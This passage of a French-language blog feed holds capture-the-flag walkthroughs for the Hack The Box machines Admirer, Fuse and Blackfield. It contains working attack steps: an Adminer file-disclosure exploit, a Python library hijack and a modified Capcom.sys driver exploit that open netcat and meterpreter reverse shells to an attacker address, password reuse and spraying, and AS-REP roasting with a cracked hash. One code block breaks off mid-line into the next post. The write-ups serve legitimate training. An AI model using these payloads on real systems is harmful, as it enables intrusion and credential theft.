+226 Directory send OK.
+ftp&gt; 
+
+```
+
+On télécharge tout ça pour investiguer.
+
+Le backup permet de comprendre la structure du site web. On a notamment un dossier &quot;utility-scripts&quot;.
+
+```
+kali@kali:~/Admirer$ ls -l
+total 28
+drwxr-x--- 6 kali kali 4096 Jun  6  2019 assets
+drwxr-x--- 4 kali kali 4096 Dec  2  2019 images
+-rw-r----- 1 kali kali 4613 Dec  3  2019 index.php
+-rw-r----- 1 kali kali  134 Dec  1  2019 robots.txt
+drwxr-x--- 2 kali kali 4096 Dec  2  2019 utility-scripts
+drwxr-x--- 2 kali kali 4096 Dec  2  2019 w4ld0s_s3cr3t_d1r
+```
+
+Ce dossier contient un script d&#39;administration &quot;admin_tasks.php&quot;
+
+http://10.10.10.187/utility-scripts/admin_tasks.php
+
+```
+kali@kali:~/Admirer/utility-scripts$ ls -l
+total 16
+-rw-r----- 1 kali kali 1795 Dec  2  2019 admin_tasks.php
+-rw-r----- 1 kali kali  401 Dec  1  2019 db_admin.php
+-rw-r----- 1 kali kali   20 Nov 29  2019 info.php
+-rw-r----- 1 kali kali   53 Dec  2  2019 phptest.php
+
+```
+
+admin_tasks.php
+
+```
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Administrative Tasks&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt;
+  &lt;?php
+  // Web Interface to the admin_tasks script
+  // 
+  if(isset($_REQUEST[&#39;task&#39;]))
+  {
+    $task = $_REQUEST[&#39;task&#39;];
+    if($task == &#39;1&#39; || $task == &#39;2&#39; || $task == &#39;3&#39; || $task == &#39;4&#39; ||
+       $task == &#39;5&#39; || $task == &#39;6&#39; || $task == &#39;7&#39;)
+    {
+      /*********************************************************************************** 
+         Available options:
+           1) View system uptime
+           2) View logged in users
+           3) View crontab (current user only)
+           4) Backup passwd file (not working)
+           5) Backup shadow file (not working)
+           6) Backup web data (not working)
+           7) Backup database (not working)
+
+           NOTE: Options 4-7 are currently NOT working because they need root privileges.
+                 I&#39;m leaving them in the valid tasks in case I figure out a way
+                 to securely run code as root from a PHP page.
+      ************************************************************************************/
+      echo str_replace(&quot;
+&quot;, &quot;&lt;br /&gt;&quot;, shell_exec(&quot;/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1&quot;));
+    }
+    else
+    {
+      echo(&quot;Invalid task.&quot;);
+    }
+  } 
+  ?&gt;
+```
+
+Impossible d’injecter une commande car le point d&#39;entrée $task est filtré.
+
+## Adminer
+
+Panne sèche... En cherchant sur google : admirer, sql et php je suis tombé sur &quot;adminer&quot;. Un outil qui est disponible ici, dans le dossier /utility-scripts/ :
+
+http://10.10.10.187/utility-scripts/adminer.php
+
+En version 4.6.2, il existe une vulnérabilité.
+
+https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability
+
+## Exploitation
+
+Pour l&#39;exploiter il nous faut un serveur mysql sur notre machine, créer une BDD, une table avec une colonne, se connecter à notre BDD depuis Adminer sur la victime, et ainsi accéder à la vulnérabilité &quot;file disclosure&quot;.
+
+Aurotiser l&#39;accès au serveur dans la config mysql /etc/mysql/mariadb.conf.d/50-server.cnf :
+
+```
+# Instead of skip-networking the default is now to listen only on
+# localhost which is more compatible and is not less secure.
+#bind-address            = 0.0.0.0
+```
+
+On créé la DB.
+
+```
+$ sudo msql -u root -p
+MariaDB [(none)]&gt; create database exploit;
+MariaDB [(none)]&gt; use exploit;
+MariaDB [exploit]&gt; create table dmp(content varchar(5000));
+MariaDB [(none)]&gt; CREATE USER &#39;exploit&#39;@&#39;%&#39; IDENTIFIED BY &#39;exploit&#39;;
+MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON exploit.* TO &#39;exploit&#39;@&#39;%&#39;;
+```
+
+ ![image-20200608203737192](/assets/img/image-20200608203737192.png)
+
+On peut lire les fichiers de la victime.
+
+![image-20200608204416636](/assets/img/image-20200608204416636.png)
+
+Résultat lisible dans la table de notre base.
+
+```
+MariaDB [(none)]&gt; use exploit;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [exploit]&gt; select * from dmp;
+...
+                         $servername = &quot;localhost&quot;;                                                                              |
+                         $username = &quot;waldo&quot;;                                                                                    |
+                         $password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;;                                                                  |
+                         $dbname = &quot;admirerdb&quot;;     
+...
+```
+
+Encore des creds :
+
+![image-20200608204749388](/assets/img/image-20200608204749388.png)
+
+## Password reuse
+
+Est-ce que Waldo aurait également utiliser ce mot de passe pour l&#39;accès ssh ?
+
+![image-20200608204935403](/assets/img/image-20200608204935403.png)
+
+## sudo -l
+
+Waldo peut exécuter ce script `(ALL) SETENV: /opt/scripts/admin_tasks.sh`en tant que root.
+
+![image-20200608205335058](/assets/img/image-20200608205335058.png)
+
+Ce script permet de lancer un autre script python, situé dans le même dossier, et donc en tant que root.
+
+![image-20200608205836917](/assets/img/image-20200608205836917.png)
+
+Il faudrait un moyen de passer un paramètre au script backup.py pour modifier son comportement.
+
+![image-20200608205934302](/assets/img/image-20200608205934302.png)
+
+## shutil
+
+Constatez qu&#39;on utilise ici une fonction `make_archive` de la librairie `shutil`. Notons que 3 paramètres sont utilisés pour appeler cette fonction. On devrait pouvoir hijacké cette librairie. https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
+
+Créons d&#39;abord notre propre `shutil.py`. Il doit être situé dans le dossier /tmp (enfin là où on peut écrire).
+
+Préparons un reverse shell python dans /tmp/shutil.py.
+
+```
+import os 
+
+# 3 paramètres nécessaires comme la fonction réelle
+def make_archive(a, b, c):
+	os.system(&#39;nc 10.10.14.27 443 -e &quot;/bin/sh&quot;&#39;)
+```
+
+On peut changer la manière dont python recherche `shutil.py` en modifiant la variable `PYTHONPATH`.  On exécute le script et on choisit d&#39;exécuter la fonction vulnérable.
+
+![image-20200608211428108](/assets/img/image-20200608211428108.png)
+
+Et notre netcat reçoit la connexion en retour. Nous sommes root.
+
+![image-20200608211500892](/assets/img/image-20200608211500892.png)</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2020-09-29-admirer.txt</guid>
+  </item>
+<item>
+<pubDate>2020-10-29T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2020/10/29/4</category>
+  <title>htb fuse</title>
+  <link>http://3r1c.net/posts/2020-10-29-fuse.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>L&#39;art de **l&#39;exploitation de driver signé** sur un OS 64 bits quand un administrateur a donné les permissions de chargé un driver (**SeLoadDriverPrivilege**) à un utilisateur.
+
+# Recon
+
+## nmap
+
+Un port web, un port ldap... Une machine windows semble-t-il.
+
+```bash
+kali@kali:~/Fuse$ nmap -p- 10.10.10.193
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 01:32 EDT
+Nmap scan report for 10.10.10.193
+Host is up (0.054s latency).
+Not shown: 65514 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49672/tcp open  unknown
+49690/tcp open  unknown
+49745/tcp open  unknown
+```
+
+## ldapsearch - un domaine AD
+
+On a un domaine AD : fabricorp.local.
+
+```bash
+kali@kali:~/Fuse$ ldapsearch -x -h 10.10.10.193 -s base
+# extended LDIF
+#
+# LDAPv3
+# base &lt;&gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+#
+dn:
+currentTime: 20200617072657.0Z
+subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=fabricorp,DC=loc
+ al
+dsServiceName: CN=NTDS Settings,CN=FUSE,CN=Servers,CN=Default-First-Site-Name,
+ CN=Sites,CN=Configuration,DC=fabricorp,DC=local
+namingContexts: DC=fabricorp,DC=local
+namingContexts: CN=Configuration,DC=fabricorp,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
+namingContexts: DC=DomainDnsZones,DC=fabricorp,DC=local
+namingContexts: DC=ForestDnsZones,DC=fabricorp,DC=local
+defaultNamingContext: DC=fabricorp,DC=local
+schemaNamingContext: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
+configurationNamingContext: CN=Configuration,DC=fabricorp,DC=local
+rootDomainNamingContext: DC=fabricorp,DC=local
+...
+supportedSASLMechanisms: GSSAPI
+supportedSASLMechanisms: GSS-SPNEGO
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+dnsHostName: Fuse.fabricorp.local
+ldapServiceName: fabricorp.local:fuse$@FABRICORP.LOCAL
+serverName: CN=FUSE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=fabricorp,DC=local
+```
+
+## website - découverte de comptes users
+
+Sur le port 80, on a bien un site web. Je confirgure mon fichier hosts.
+
+```bash
+http://fuse.fabricorp.local/papercut/logs/html/index.htm
+
+sudo vi /etc/hosts
+10.10.10.193    fuse.fabricorp.local
+```
+
+Un joli site &quot;PaperCut&quot;.
+
+![](/assets/img/image-20200617085623377.png)
+
+Dans un des fichiers CSV, je découvre quelques utilisateurs, et je pense que j&#39;ai peut être un mot de passe ici.
+
+![](/assets/img/image-20200617094033662.png)
+
+## rcpclient - tester le mdp
+
+Je teste chaque utilisateur avec ce mot de passe. Pour le compte _tlavel_, la réponse du serveur est &quot;NT_STATUS_PASSWORD_MUST_CHANGE&quot;. Ce qui signifie que le mot de passe est correct mais nécessite un changement.
+
+```bash
+kali@kali:~/Fuse$ rpcclient -U &quot;fabricorp\perton&quot; 10.10.10.193 
+Enter FABRICORP\perton&#39;s password: 
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+
+kali@kali:~/Fuse$ rpcclient -U &quot;fabricorp\tlavel&quot; 10.10.10.193 
+Enter FABRICORP	lavel&#39;s password: 
+Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE
+```
+
+## smbpasswd - changer le mdp
+
+Je renouvelle le mot de passe du compte `tlavel`.
+
+```bash
+kali@kali:~/Fuse$ smbpasswd -U &quot;fabricorp\tlavel&quot; -r 10.10.10.193
+Old SMB password: &lt;Fabricorp01&gt;
+New SMB password: &lt;p@ssw0rd&gt;
+Retype new SMB password: &lt;p@ssw0rd&gt;
+Password changed for user tlavel
+```
+
+## smbclient - enum des shares
+
+Je constate que vous avons un spooler actif sur ce contrôleur de domaine.
+
+```bash
+kali@kali:~/fuse$ smbclient -L \\10.10.10.193 -U &quot;fabricorp\tlavel&quot;
+Unable to initialize messaging context
+Enter FABRICORP	lavel&#39;s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        HP-MFT01        Printer   HP-MFT01
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        print$          Disk      Printer Drivers
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+```
+
+Le mot de passe de `tlavel` est réinitialisé très rapidement. Il faut être rapide dans les recherches. En lien avec le spooler actif, je vérifie les imprimantes connectées.
+
+## rpcclient - enum des imprimantes
+
+```bash
+rpcclient $&gt; enumprinters 
+        flags:[0x800000]
+        name:[\10.10.10.193\HP-MFT01]
+        description:[\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central
+        (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+        comment:[]
+```
+
+La description de l&#39;imprimante contient un mot de passe, pour un compte `scan2docs` : **$fab@s3Rv1ce$1**
+
+## rpcclient - emum des users du domaine
+
+```bash
+rpcclient $&gt; enumdomusers
+    user:[Administrator] rid:[0x1f4]
+    user:[Guest] rid:[0x1f5]
+    user:[krbtgt] rid:[0x1f6]
+    user:[DefaultAccount] rid:[0x1f7]
+    user:[svc-print] rid:[0x450]
+    user:[bnielson] rid:[0x451]
+    user:[sthompson] rid:[0x641]
+    user:[tlavel] rid:[0x642]
+    user:[pmerton] rid:[0x643]
+    user:[svc-scan] rid:[0x645]
+    user:[bhult] rid:[0x1bbd]
+    user:[dandrews] rid:[0x1bbe]
+    user:[mberbatov] rid:[0x1db1]
+    user:[astein] rid:[0x1db2]
+    user:[dmuir] rid:[0x1db3]
+```
+
+Notons que le compte `svc-scan` sera utile juste après.
+
+# low priv shell
+
+Je tente d&#39;associer le mot de passe précédemment découvert au compte **svc-print** et c&#39;est gagné :)
+
+```bash
+kali@kali:~/fuse$ evil-winrm -i 10.10.10.193 -u svc-print
+Enter Password: 
+Evil-WinRM shell v2.3
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-print\Documents&gt; 
+```
+
+# Priv esc
+
+## SeLoadDriverPrivilege
+
+Je vérifie d&#39;abord mes privilèges. Il semblerait que je puisse charger un driver. **SeLoadDriverPrivilege** comme son nom le suggère octroie la capacité de charger n&#39;importe quel driver. Et pour faire simple : être capable d&#39;insérer du code dans le kernel  = game over.
+
+ ```bash
+*Evil-WinRM* PS C:\users\svc-print\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+ ```
+
+## Capcom.sys Driver Exploit
+
+Sur les systèmes 64bits, le Kernel Mode Code Signing (KMCS) est activé, et il est **impossible** de charger un driver **non signé**. Il s&#39;agit là au mieux d&#39;une fonctionnalité pour assurer l&#39;intégrité du code, souvent présentée comme une fonction de sécurité. Rien empêche toutefois un attaquant de charger **un driver signé vulnérable** et de l&#39;exploiter. L&#39;intégrité du kernel serait compromise.
+
+Utilisons un driver bien connu pour être vulnérable et signé ! **Capcom.sys**. Il peut être téléchargé ici :
+
+https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
+
+On aura besoin de compiler ces deux exploits.
+
+- https://github.com/tandasat/ExploitCapcom
+
+- https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp
+
+## ExploitCapcom.cpp
+
+Je modifie la ligne 292 du POC ExploitCapcom.cpp [^1] pour obtenir un reverse shell avec un netcat. Je m&#39;apercevrai plus tard que netcat ne fonctionnera pas. J&#39;utiliserai alors un meterpreter. J&#39;y reviendrai.
+
+Modifier :
+
+```bash
+static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT(&quot;C:\Windows\system32\cmd.exe&quot;);
+```
+
+en :
+
+```bash
+static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT(&quot;C:\test\nc.exe -nv 10.10.14.35 443&quot;);
+```
+
+Et je le compile ExploitCapcom.cpp avec VS2015.
+
+## EoPLoadDriver.cpp
+
+Je compile également : EoPLoadDriver.cpp [^2]. Il faut passer par un nouveau projet `Console App` et importer le code c++.
+
+1. New &gt; Project &gt; Visual C++ &gt; Win32 &gt; Console App
+2. Source File &gt; Add &gt; Existing Item
+3. Barre d&#39;outils, choisir Release / x64
+4. F5 pour compiler
+
+## Préparation
+
+Grâce à mon shell Evil-WinRM, j&#39;upload nc.exe dans `c:	est`.
+
+```bash
+*Evil-WinRM* PS C:	est&gt; upload /usr/share/windows-resources/binaries/nc.exe
+```
+
+J&#39;upload le driver et les deux codes compilés.
+
+```bash
+*Evil-WinRM* PS C:	est&gt; upload Capcom.sys
+*Evil-WinRM* PS C:	est&gt; upload ExploitCapcom.exe
+*Evil-WinRM* PS C:	est&gt; upload eoploaddriver.exe
+```
+
+Je charge le driver Capcom.sys sur la victime.
+
+```bash
+*Evil-WinRM* PS C:	est&gt; eoploaddriver.exe System\CurrentControlSet\MyService c:	est\Capcom.sys
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
+NTSTATUS: 00000000, WinError: 0
+```
+
+## Exploit
+
+Maintenant je peux utiliser le driver chargé pour l&#39;exploiter et exécuter du code arbitraire, à savoir un reverse shell en tant que SYSTEM.
+
+Et je lance l&#39;exploit. 1er essai avec un reverse shell netcat échoué.
+
+```bash
+*Evil-WinRM* PS C:	est&gt; .\ExploitCapcom.exe
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000068
+[*] Shellcode was placed at 0000029108910008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[-] CreateProcess() failed
+```
+
+Alors j&#39;opte pour un meterpreter.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.35 LPORT=443 -f exe &gt; shell.exe
+```
+
+Je modifie le code de ExploitCapcom.cpp pour appeler shell.exe
+
+```bash
+static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT(&quot;C:\test\shell.exe&quot;);
+```
+
+J&#39;upload shell.exe et je lance l&#39;exploit.
+
+```bash
+*Evil-WinRM* PS C:	est&gt; upload shell.exe
+*Evil-WinRM* PS C:	est&gt; .\ExploitCapcom.exe
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 000002345ED10008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] The SYSTEM shell was launched
+[*] Press any key to exit this program
+```
+
+Et sur mon listener metasploit, j&#39;obtiens mon reverse shell.
+
+```bash
+msf5 &gt; use exploit/multi/handler 
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set lhost 10.10.14.35
+lhost =&gt; 10.10.14.35
+msf5 exploit(multi/handler) &gt; set lport 443
+lport =&gt; 443
+msf5 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.35:443 
+[*] Sending stage (180291 bytes) to 10.10.10.193
+[*] Meterpreter session 1 opened (10.10.14.35:443 -&gt; 10.10.10.193:55890) at 2020-07-01 09:56:48 -0400
+
+meterpreter &gt; 
+```
+
+![](/assets/img/image-20200701161904745.png)
+
+
+
+### Alternative VbLoadDriver.exe
+
+En alternative au code EoPLoadDriver.cpp en c++, il existe une version dotnet : VbLoadDriver.exe
+
+https://github.com/VbScrub/VbLoadDriver/raw/master/VbLoadDriver.exe
+
+On upload... Puis il nous faut le SID de l&#39;utilisateur :
+
+```bash
+*Evil-WinRM* PS C:\users\svc-print\Documents&gt; get-aduser svc-print
+
+
+DistinguishedName : CN=svc-print,CN=Users,DC=fabricorp,DC=local
+Enabled           : True
+GivenName         :
+Name              : svc-print
+ObjectClass       : user
+ObjectGUID        : d3482aa7-6cd7-4547-83c5-74ed2bc605fd
+SamAccountName    : svc-print
+SID               : S-1-5-21-2633719317-1471316042-3957863514-1104
+Surname           :
+UserPrincipalName :
+```
+
+
+
+```bash
+*Evil-WinRM* PS C:\users\svc-print\Documents&gt; .\VbLoadDriver.exe HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService C:\users\svc-print\Documents<item>
+<pubDate>2022-02-17T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2022/02/17/4</category>
+  <title>htb blackfield</title>
+  <link>http://3r1c.net/posts/2022-02-17-blackfield-hackthebox.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Blackfield, mi pentest mi forensic :)
+
+## Résumé
+
+- Connexion Anonyme  un partage **profiles$**
+- Découverte d&#39;une liste d&#39;utilisateur basée sur une liste de répertoires
+- Génération d&#39;un TGT pour un utilisateur valide
+- Casser le hash avec John
+- Connexion avec rpcclient, nous avons les permissions de réinitialiser un mot de passe
+- Réinitialisation du mot de passe du compte audit2020
+- Le compte audit2020 peut lire le partage forensic
+- Il contient un fichier lsass.zip correspondant à un dump mémoire du processus lsass.exe
+- Obtention des hashs des comptes administrator (mauvais hash) et svc_backup
+- Le compte svc_backup dispose du privilège SeBackupPrivilege, il permet de copier ntds.dit
+- Possibilité de dumper la base Active Directory ndts.dit
+- Obtention du hash Administrator
+
+---
+
+## Recon
+
+### nmap
+
+
+	kali@kali:~/blackfield$ nmap -Pn -p- 10.10.10.192
+	Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 12:16 EDT
+	Nmap scan report for 10.10.10.192
+	Host is up (0.075s latency).
+	Not shown: 65527 filtered ports
+	PORT     STATE SERVICE
+	53/tcp   open  domain
+	88/tcp   open  kerberos-sec
+	135/tcp  open  msrpc
+	389/tcp  open  ldap
+	445/tcp  open  microsoft-ds
+	593/tcp  open  http-rpc-epmap
+	3268/tcp open  globalcatLDAP
+	5985/tcp open  wsman
+
+### ldapsearch
+
+	kali@kali:~/blackfield$ ldapsearch -x -h 10.10.10.192 -s base
+	# extended LDIF
+	#
+	# LDAPv3
+	# base &lt;&gt; (default) with scope baseObject
+	# filter: (objectclass=*)
+	# requesting: ALL
+	#
+	
+	#
+	dn:
+	domainFunctionality: 7
+	forestFunctionality: 7
+	domainControllerFunctionality: 7
+	rootDomainNamingContext: DC=BLACKFIELD,DC=local
+	ldapServiceName: BLACKFIELD.local:dc01$@BLACKFIELD.LOCAL
+	isGlobalCatalogReady: TRUE
+	supportedSASLMechanisms: GSSAPI
+	supportedSASLMechanisms: GSS-SPNEGO
+	supportedSASLMechanisms: EXTERNAL
+	supportedSASLMechanisms: DIGEST-MD5
+	supportedLDAPVersion: 3
+	supportedLDAPVersion: 2
+	...
+	subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=lo
+	 cal
+	serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
+	 ation,DC=BLACKFIELD,DC=local
+	schemaNamingContext: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
+	namingContexts: DC=BLACKFIELD,DC=local
+	namingContexts: CN=Configuration,DC=BLACKFIELD,DC=local
+	namingContexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
+	namingContexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
+	namingContexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
+	isSynchronized: TRUE
+	highestCommittedUSN: 184708
+	dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
+	 CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
+	dnsHostName: DC01.BLACKFIELD.local
+	defaultNamingContext: DC=BLACKFIELD,DC=local
+	currentTime: 20200614024518.0Z
+	configurationNamingContext: CN=Configuration,DC=BLACKFIELD,DC=local
+
+### smbclient
+
+	kali@kali:~/blackfield$ smbclient -L \\10.10.10.192
+	Unable to initialize messaging context
+	Enter WORKGROUP\kali&#39;s password: 
+	
+		    Sharename       Type      Comment
+		    ---------       ----      -------
+		    ADMIN$          Disk      Remote Admin
+		    C$              Disk      Default share
+		    forensic        Disk      Forensic / Audit share.
+		    IPC$            IPC       Remote IPC
+		    NETLOGON        Disk      Logon server share 
+		    profiles$       Disk      
+		    SYSVOL          Disk      Logon server share 
+
+Le dossier forensic n&#39;est pas accessible
+
+	kali@kali:~/blackfield$ smbclient  //10.10.10.192/forensic
+	Enter WORKGROUPoots password: 
+	Try &quot;help&quot; to get a list of possible commands.
+	smb: \&gt; ls
+	NT_STATUS_ACCESS_DENIED listing \*
+	smb: \&gt;
+
+Un autre dossier contient une arborescence de dossiers utilisateurs.
+
+	kali@kali:~/blackfield$ smbclient \\10.10.10.192\profiles$ -U &quot;&quot;
+	Unable to initialize messaging context
+	Enter WORKGROUP\&#39;s password: 
+	Try &quot;help&quot; to get a list of possible commands.
+	smb: \&gt; dir
+	  .                                   D        0  Wed Jun  3 12:47:12 2020
+	  ..                                  D        0  Wed Jun  3 12:47:12 2020
+	  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
+	  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
+	  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
+	  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
+	...
+	  audit2020                           D        0  Wed Jun  3 12:47:11 2020
+	...
+	  support                             D        0  Wed Jun  3 12:47:12 2020
+	  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
+	...
+
+Je prends la liste des 315 users dans users.txt.
+
+	kali@kali:~/blackfield$ cat users.txt | wc -l
+	315
+	
+	kali@kali:~/blackfield$ nmap -Pn -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=BLACKFIELD.LOCAL,userdb=users.txt 10.10.10.192
+	Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 16:21 EDT
+	Nmap scan report for 10.10.10.192
+	Host is up (0.058s latency).
+	
+	PORT   STATE SERVICE
+	88/tcp open  kerberos-sec
+	| krb5-enum-users: 
+	| Discovered Kerberos principals
+	|     audit2020@BLACKFIELD.LOCAL
+	|_    svc_backup@BLACKFIELD.LOCAL
+
+
+### AP-REP Roasting
+
+Il s&#39;agit d&#39;exploiter une faiblesse du protocole Kerberos qui se produit lors d&#39;une authentification initial avec un KDC (Key Distribution Center).
+
+Pendant cette phase initiale, un utilisateur demande un TGT (Ticket  Granting Ticket) au KDC au moyen d&#39;un paquet AS-REQ. Si le compte existe, le KDC retourne un TGT chiffré avec les crédentiels du compte utilisateur. De ce fait, seuls un utilisateur ou une machine possédant les crédentiels valident peuvent déchiffrer le ticket.
+
+Ainsi tout utilisateur qui serait capable de faire une requête au KDC peut également demander un TGT pour n&#39;importe quel utilisateur. Un attaquant peut recevoir un ticket chiffré qui peut évidemment être forcé (bruteforcé) hors ligne pour révéler le mot de passe du compte utilisateur. C&#39;est très similaire, mais à ne pas confondre avec Kerberoasting.
+
+Heureusement cette vulnérabilité est patchée par défaut sur tous les déploiements Active Directory : seul un compte qui a le mot de passe peut demander un TGT au KDC. Le client doit chiffrer un timestamp avec des crédentiels valides avant de l&#39;envoyer au KDC.
+
+Quand on créé un compte sur un Domain Controller, on peut s&#39;affranchir de cette protection en activant l&#39;option &quot;Do not require Kerberos Preauthentication&quot;. Par défaut cette option est désactivée. Cependant, si le domaine contient des comptes avec cette option activée, un attaquant a la possibilité de forcer les mots de passe des comptes concernés.
+
+#### Utiliser GetNPuser.py pour obtenir un tgt
+
+https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+
+Le script [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) peut être utilisé depuis une machine Linux dans le but de récolter les réponses non-preauth AS_REP.
+
+	kali@kali:~/blackfield$ GetNPUsers.py blackfield.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.192
+	Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation
+	
+	[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+	[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+	...
+	[-] User audit2020 doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+	...
+	[-] User svc_backup doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+
+
+On a le hash du compte _support_.
+
+	kali@kali:~/blackfield$ cat hashes.asreproast 
+	$krb5asrep$23$support@BLACKFIELD.LOCAL:8a4bc807c01099cd37198c419c0f6541$0171ea5c1d9cccdbfb6f7d7942fbbd553dab5bd5a724fcebe58c6aaa82a2b967a31f5441bafe3a4827a3c2acf92d686f43497828ac33000b98a823caa656e555dacb1173ecc866dbdcafef0a0f5a4a91b73ba60d15bd5282574f11363df3f65bd28b58308b099a19a8503779e2bc672897b74c948f0130b655c1787b2d93993508ff3281a49986591d54f1ccfc3e40564de65270215bb5bc66cbc8623351cfdde06f4f96ce4350814e8b12ebbaf0ca5e4c617efaf80b1913d52ad544fb7115bb63c856dbb962802f0a281617726a7f21b9adaf18edbb7512bf41ad1bebc3c358a55cf9a5748baf9ca9e68eccad203ec8f20a38f1
+
+Pour casser le hash obtenu, j&#39;utilise hashcat et une attaque par &quot;dictionnaire&quot;.
+
+	kali@kali:~/blackfield$ hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt 
+	...
+	$krb5asrep$23$support@BLACKFIELD.LOCAL:8a4bc807c01099cd37198c419c0f6541$0171ea5c1d9cccdbfb6f7d7942fbbd553dab5bd5a724fcebe58c6aaa82a2b967a31f5441bafe3a4827a3c2acf92d686f43497828ac33000b98a823caa656e555dacb1173ecc866dbdcafef0a0f5a4a91b73ba60d15bd5282574f11363df3f65bd28b58308b099a19a8503779e2bc672897b74c948f0130b655c1787b2d93993508ff3281a49986591d54f1ccfc3e40564de65270215bb5bc66cbc8623351cfdde06f4f96ce4350814e8b12ebbaf0ca5e4c617efaf80b1913d52ad544fb7115bb63c856dbb962802f0a281617726a7f21b9adaf18edbb7512bf41ad1bebc3c358a55cf9a5748baf9ca9e68eccad203ec8f20a38f1:#00^BlackKnight
+	...
+
